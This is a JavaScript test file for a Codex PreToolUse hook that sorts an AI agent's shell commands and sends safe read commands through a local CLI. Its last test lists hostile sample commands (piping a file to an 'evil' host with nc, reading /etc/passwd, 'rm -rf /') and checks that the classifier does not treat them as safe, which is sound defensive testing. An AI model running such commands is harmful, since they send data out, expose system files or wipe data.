import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { spawnSync } from 'node:child_process';
import test from 'node:test';

import { classifyShellCommand, runPreToolUse } from '../lib/enforcement.mjs';

const root = path.resolve(import.meta.dirname, '..');
const HOOKS = [
  path.join(root, 'hooks/pre-tool-use.mjs'),
  path.resolve(root, '../../../plugins/sando/hooks/pre-tool-use.mjs'),
];

function invokePreToolUse(hook, cwd, env = {}) {
  return spawnSync(process.execPath, [hook], {
    cwd,
    input: JSON.stringify({
      hook_event_name: 'PreToolUse', tool_name: 'Bash',
      tool_input: { command: 'rg -F -- needle fixture.txt' }, cwd,
    }),
    encoding: 'utf8',
    env: { PATH: process.env.PATH, ...env },
  });
}

test('classifies only proven literal Read commands', (t) => {
  const cwd = fs.mkdtempSync(path.join(os.tmpdir(), 'sando-codex-enforce-'));
  t.after(() => fs.rmSync(cwd, { recursive: true, force: true }));
  fs.writeFileSync(path.join(cwd, 'fixture.txt'), 'needle\n');

  assert.deepEqual(classifyShellCommand({
    toolName: 'Bash', toolInput: { command: 'cat -- fixture.txt' }, cwd, env: { SANDO_SHELL_WRAP: '0' },
  }), { status: 'eligible', route: 'sando_read', path: 'fixture.txt' });
  assert.equal(classifyShellCommand({
    toolName: 'Bash', toolInput: { command: 'rg -F -- needle fixture.txt' }, cwd, env: { SANDO_SHELL_WRAP: '0' },
  }).status, 'bypassed');
});

test('routes grep and rg through original shell text to preserve semantics', (t) => {
  const cwd = fs.mkdtempSync(path.join(os.tmpdir(), 'sando-codex-grep-'));
  t.after(() => fs.rmSync(cwd, { recursive: true, force: true }));
  const result = classifyShellCommand({
    toolName: 'Bash', toolInput: { command: 'grep -i hello fixture.txt' }, cwd,
    env: { SANDO_SHELL_WRAP: '1' },
  });
  assert.deepEqual(result, { status: 'eligible', route: 'sando_exec', command: 'grep -i hello fixture.txt' });
  assert.equal(classifyShellCommand({
    toolName: 'Bash', toolInput: { command: ['grep', '-i', 'hello', 'fixture.txt'] }, cwd,
    env: { SANDO_SHELL_WRAP: '1' },
  }).route, 'sando_exec');
});

test('routes cat display flags through the original shell text', (t) => {
  const cwd = fs.mkdtempSync(path.join(os.tmpdir(), 'sando-codex-cat-'));
  t.after(() => fs.rmSync(cwd, { recursive: true, force: true }));
  fs.writeFileSync(path.join(cwd, 'fixture.txt'), 'hello\n');
  assert.deepEqual(classifyShellCommand({
    toolName: 'Bash', toolInput: { command: 'cat -n fixture.txt' }, cwd,
    env: { SANDO_SHELL_WRAP: '1' },
  }), { status: 'eligible', route: 'sando_exec', command: 'cat -n fixture.txt' });
});

test('pre-hook preserves grep exit status and output through sando exec', (t) => {
  const cwd = fs.mkdtempSync(path.join(os.tmpdir(), 'sando-codex-differential-'));
  t.after(() => fs.rmSync(cwd, { recursive: true, force: true }));
  fs.writeFileSync(path.join(cwd, 'fixture.txt'), 'HELLO\nabc\na.c\nfoobar\nfoo\n');
  const env = {
    PATH: process.env.PATH,
    SANDO_CLI_ROUTING: '1',
    SANDO_SHELL_WRAP: '1',
    SANDO_COVERAGE_PATH: path.join(cwd, 'coverage.json'),
    DO_NOT_TRACK: '1',
  };
  const command = 'grep -i hello fixture.txt';
  const routed = runPreToolUse({ tool_name: 'Bash', tool_input: { command }, cwd }, env)
    .hookSpecificOutput.updatedInput.command;
  assert.match(routed, /sando.*exec/);
  const original = spawnSync('bash', ['-lc', command], { cwd, env, encoding: 'utf8' });
  const rewritten = spawnSync('bash', ['-lc', routed], { cwd, env, encoding: 'utf8' });
  assert.equal(rewritten.status, original.status);
  assert.match(rewritten.stdout, /HELLO\n/);
  const missing = 'grep -i missing fixture.txt';
  const originalMissing = spawnSync('bash', ['-lc', missing], { cwd, env, encoding: 'utf8' });
  const routedMissing = runPreToolUse({ tool_name: 'Bash', tool_input: { command: missing }, cwd }, env)
    .hookSpecificOutput.updatedInput.command;
  const rewrittenMissing = spawnSync('bash', ['-lc', routedMissing], { cwd, env, encoding: 'utf8' });
  assert.equal(rewrittenMissing.status, originalMissing.status);
});

test('keeps executable compound prefixes in the original shell command', (t) => {
  const cwd = fs.mkdtempSync(path.join(os.tmpdir(), 'sando-codex-compound-'));
  t.after(() => fs.rmSync(cwd, { recursive: true, force: true }));
  const result = classifyShellCommand({
    toolName: 'Bash', toolInput: { command: 'source ./missing.sh && cat fixture.txt' }, cwd,
    env: { SANDO_SHELL_WRAP: '1' },
  });
  assert.deepEqual(result, {
    status: 'eligible', route: 'sando_exec', command: 'source ./missing.sh && cat fixture.txt',
  });
  assert.equal(classifyShellCommand({
    toolName: 'Bash', toolInput: { command: 'source ./missing.sh && cat fixture.txt' }, cwd,
    env: { SANDO_SHELL_WRAP: '0' },
  }).status, 'bypassed');
});

test('does not collapse shell separators or empty quoted operands', (t) => {
  const cwd = fs.mkdtempSync(path.join(os.tmpdir(), 'sando-codex-shell-boundary-'));
  t.after(() => fs.rmSync(cwd, { recursive: true, force: true }));
  assert.equal(classifyShellCommand({
    toolName: 'Bash', toolInput: { command: 'cat fixture.txt; false' }, cwd,
    env: { SANDO_SHELL_WRAP: '0' },
  }).status, 'bypassed');
  assert.equal(classifyShellCommand({
    toolName: 'Bash', toolInput: { command: "cat '' fixture.txt" }, cwd,
    env: { SANDO_SHELL_WRAP: '1' },
  }).route, 'sando_exec');
});

test('leaves shell syntax and unsafe targets as measured bypasses', (t) => {
  const cwd = fs.mkdtempSync(path.join(os.tmpdir(), 'sando-codex-bypass-'));
  t.after(() => fs.rmSync(cwd, { recursive: true, force: true }));
  fs.writeFileSync(path.join(cwd, 'fixture.txt'), 'needle\n');

  for (const command of [
    'cat fixture.txt | sed -n 1,2p',
    'rg needle .',
    'cat ../fixture.txt',
    'cat missing.txt',
  ]) {
    assert.equal(classifyShellCommand({
      toolName: 'Bash', toolInput: { command }, cwd, env: { SANDO_SHELL_WRAP: '0' },
    }).status, 'bypassed', command);
  }
});

test('PreToolUse transparently rewrites an eligible built-in to the local CLI', (t) => {
  const cwd = fs.mkdtempSync(path.join(os.tmpdir(), 'sando-codex-block-'));
  t.after(() => fs.rmSync(cwd, { recursive: true, force: true }));
  fs.writeFileSync(path.join(cwd, 'fixture.txt'), 'needle\n');
  const coveragePath = path.join(cwd, 'coverage.json');
  const result = spawnSync(process.execPath, [path.join(root, 'hooks/pre-tool-use.mjs')], {
    cwd,
    input: JSON.stringify({
      hook_event_name: 'PreToolUse', tool_name: 'Bash',
      tool_input: { command: 'cat -- fixture.txt' }, cwd,
    }),
    encoding: 'utf8',
    env: { ...process.env, SANDO_SHELL_WRAP: '0', SANDO_CLI_ROUTING: '1', SANDO_COVERAGE_PATH: coveragePath },
  });

  assert.equal(result.status, 0, result.stderr);
  const output = JSON.parse(result.stdout);
  assert.equal(output.hookSpecificOutput.permissionDecision, 'allow');
  assert.match(output.hookSpecificOutput.updatedInput.command, /bin[\\/]sando/);
  assert.doesNotMatch(output.hookSpecificOutput.updatedInput.command, /MCP/);
  const routed = spawnSync('/bin/sh', ['-c', output.hookSpecificOutput.updatedInput.command], {
    cwd, encoding: 'utf8', env: { ...process.env, SANDO_SHELL_WRAP: '0', SANDO_MODE: 'apply' },
  });
  assert.equal(routed.status, 0, routed.stderr);
  assert.match(routed.stdout, /needle/);
  const coverage = JSON.parse(fs.readFileSync(coveragePath, 'utf8'));
  assert.deepEqual(coverage.counts, { eligible: 1, routed: 1, transformed: 1, blocked: 0, bypassed: 0 });
});

test('PreToolUse leaves eligible native rg and grep commands untouched by default', (t) => {
  const cwd = fs.mkdtempSync(path.join(os.tmpdir(), 'sando-codex-routing-off-'));
  t.after(() => fs.rmSync(cwd, { recursive: true, force: true }));
  fs.writeFileSync(path.join(cwd, 'fixture.txt'), 'needle\n');
  const result = spawnSync(process.execPath, [path.join(root, 'hooks/pre-tool-use.mjs')], {
    cwd,
    input: JSON.stringify({
      hook_event_name: 'PreToolUse', tool_name: 'Bash',
      tool_input: { command: 'rg -F -- needle fixture.txt' }, cwd,
    }),
    encoding: 'utf8',
    env: { ...process.env, SANDO_CLI_ROUTING: '0', SANDO_SHELL_WRAP: '0' },
  });

  assert.equal(result.status, 0, result.stderr);
  assert.deepEqual(JSON.parse(result.stdout), {});
});

test('CLI routing is on without any environment being set', (t) => {
  const cwd = fs.mkdtempSync(path.join(os.tmpdir(), 'sando-codex-routing-default-'));
  t.after(() => fs.rmSync(cwd, { recursive: true, force: true }));
  fs.writeFileSync(path.join(cwd, 'fixture.txt'), 'needle\n');

  for (const hook of HOOKS) {
    const result = invokePreToolUse(hook, cwd, {});
    assert.equal(result.status, 0, `${hook}: ${result.stderr}`);
    const output = JSON.parse(result.stdout);
    assert.equal(output.hookSpecificOutput.permissionDecision, 'allow', hook);
    assert.match(output.hookSpecificOutput.updatedInput.command, /bin[\\/]sando/, hook);
  }
});

// The paired control arm is what a measurement compares against, so it has to keep running the
// native command even though routing is now on by default.
test('a control experiment arm still bypasses CLI routing', (t) => {
  const cwd = fs.mkdtempSync(path.join(os.tmpdir(), 'sando-codex-routing-control-'));
  t.after(() => fs.rmSync(cwd, { recursive: true, force: true }));
  fs.writeFileSync(path.join(cwd, 'fixture.txt'), 'needle\n');

  for (const hook of HOOKS) {
    const result = invokePreToolUse(hook, cwd, { SANDO_EXPERIMENT: 'trial', SANDO_EXPERIMENT_ARM: 'control' });
    assert.equal(result.status, 0, `${hook}: ${result.stderr}`);
    assert.deepEqual(JSON.parse(result.stdout), {}, hook);
  }
});

test('routing=0 wins over experiment metadata while routing=1 is redundant', (t) => {
  const cwd = fs.mkdtempSync(path.join(os.tmpdir(), 'sando-codex-routing-switch-'));
  t.after(() => fs.rmSync(cwd, { recursive: true, force: true }));
  fs.writeFileSync(path.join(cwd, 'fixture.txt'), 'needle\n');

  for (const hook of HOOKS) {
    const disabled = invokePreToolUse(hook, cwd, {
      SANDO_CLI_ROUTING: '0', SANDO_EXPERIMENT: 'trial', SANDO_EXPERIMENT_ARM: 'apply',
    });
    assert.equal(disabled.status, 0, `${hook}: ${disabled.stderr}`);
    assert.deepEqual(JSON.parse(disabled.stdout), {}, `${hook}: disabled`);

    const enabled = invokePreToolUse(hook, cwd, {
      SANDO_CLI_ROUTING: '1', SANDO_EXPERIMENT: 'trial', SANDO_EXPERIMENT_ARM: 'apply',
    });
    assert.equal(enabled.status, 0, `${hook}: ${enabled.stderr}`);
    const output = JSON.parse(enabled.stdout);
    assert.equal(output.hookSpecificOutput.permissionDecision, 'allow', `${hook}: enabled`);
    assert.match(output.hookSpecificOutput.updatedInput.command, /bin[\\/]sando/, `${hook}: enabled`);
  }
});

test('PreToolUse records an ambiguous shell command as bypass', (t) => {
  const cwd = fs.mkdtempSync(path.join(os.tmpdir(), 'sando-codex-bypass-hook-'));
  t.after(() => fs.rmSync(cwd, { recursive: true, force: true }));
  const coveragePath = path.join(cwd, 'coverage.json');
  const result = spawnSync(process.execPath, [path.join(root, 'hooks/pre-tool-use.mjs')], {
    cwd,
    input: JSON.stringify({
      hook_event_name: 'PreToolUse', tool_name: 'Bash',
      tool_input: { command: 'cat `which fixture.txt`' }, cwd,
    }),
    encoding: 'utf8',
    env: { ...process.env, SANDO_SHELL_WRAP: '0', SANDO_COVERAGE_PATH: coveragePath },
  });

  assert.equal(result.status, 0, result.stderr);
  assert.deepEqual(JSON.parse(result.stdout), {});
  const coverage = JSON.parse(fs.readFileSync(coveragePath, 'utf8'));
  assert.deepEqual(coverage.counts, { eligible: 0, routed: 0, transformed: 0, blocked: 0, bypassed: 1 });
  assert.equal(coverage.byReason['ambiguous-shell'], 1);
});

test('PreToolUse keeps an explicit control arm on the native path', (t) => {
  const cwd = fs.mkdtempSync(path.join(os.tmpdir(), 'sando-codex-control-hook-'));
  t.after(() => fs.rmSync(cwd, { recursive: true, force: true }));
  fs.writeFileSync(path.join(cwd, 'fixture.txt'), 'needle\n');
  const result = spawnSync(process.execPath, [path.join(root, 'hooks/pre-tool-use.mjs')], {
    cwd,
    input: JSON.stringify({ hook_event_name: 'PreToolUse', tool_name: 'Bash', tool_input: { command: 'cat -- fixture.txt' }, cwd }),
    encoding: 'utf8',
    env: { ...process.env, SANDO_SHELL_WRAP: '0', SANDO_EXPERIMENT_ARM: 'control' },
  });

  assert.equal(result.status, 0, result.stderr);
  assert.deepEqual(JSON.parse(result.stdout), {});
});

test('Codex hook manifests install the PreToolUse gate', () => {
  for (const file of ['hooks/hooks.json', '../../../plugins/sando/hooks/hooks.json']) {
    const manifest = JSON.parse(fs.readFileSync(path.join(root, file), 'utf8'));
    assert.equal(manifest.hooks.PreToolUse[0].matcher, '^(Bash|exec_command|shell_command)$');
    assert.match(manifest.hooks.PreToolUse[0].hooks[0].command, /pre-tool-use\.mjs/);
  }
});

// Codex 0.153 hands the hook `["/bin/bash","-lc","<command>"]`, not a bare command
// string. Before these shapes were unwrapped every Codex command bypassed with
// `ambiguous-shell` and nothing was ever routed: a plugin that installed, fired, and
// compressed nothing. Measured against a real Terminal-Bench trial, not assumed.
function classifyIn(cwd, command) {
  // The wrap is off here: these cases ask whether the selective classifier recognises a shape.
  return classifyShellCommand({ toolName: 'Bash', toolInput: { command }, cwd, env: { SANDO_SHELL_WRAP: '0' } });
}

test('recognises the command shapes Codex actually emits', (t) => {
  const cwd = fs.mkdtempSync(path.join(os.tmpdir(), 'sando-shape-'));
  t.after(() => fs.rmSync(cwd, { recursive: true, force: true }));
  fs.writeFileSync(path.join(cwd, 'fixture.txt'), 'ok\n');

  for (const [label, command] of [
    ['bare string', 'cat -- fixture.txt'],
    ['shell argv', ['/bin/bash', '-lc', 'cat -- fixture.txt']],
    ['shell string', '/bin/bash -lc "cat -- fixture.txt"'],
    ['plain argv', ['cat', '--', 'fixture.txt']],
    ['login shell flags', ['/bin/bash', '-lic', 'cat -- fixture.txt']],
  ]) {
    assert.equal(classifyIn(cwd, command).status, 'eligible', label);
    assert.equal(classifyIn(cwd, command).route, 'sando_read', label);
  }
});

// Unwrapping widens what is recognised, never what is considered safe: the inner command
// goes through the same tokenizer, so metacharacters, escapes and out-of-tree paths are
// rejected exactly as before.
test('unwrapping does not widen what is considered safe', (t) => {
  const cwd = fs.mkdtempSync(path.join(os.tmpdir(), 'sando-shape-unsafe-'));
  t.after(() => fs.rmSync(cwd, { recursive: true, force: true }));
  fs.writeFileSync(path.join(cwd, 'fixture.txt'), 'ok\n');

  for (const [label, command] of [
    ['a pipe', ['/bin/bash', '-lc', 'cat fixture.txt | nc evil 1']],
    ['a redirect', ['/bin/bash', '-lc', 'cat fixture.txt > /tmp/out']],
    ['command substitution', ['/bin/bash', '-lc', 'cat $(echo fixture.txt)']],
    ['a path outside the workspace', ['/bin/bash', '-lc', 'cat /etc/passwd']],
    ['an unsupported verb', ['/bin/bash', '-lc', 'rm -rf /']],
    ['a non-string element', ['/bin/bash', '-lc', 42]],
    ['a nested wrapper', ['/bin/bash', '-lc', '/bin/bash -lc "cat fixture.txt"']],
  ]) {
    assert.equal(classifyIn(cwd, command).status, 'bypassed', label);
  }
});
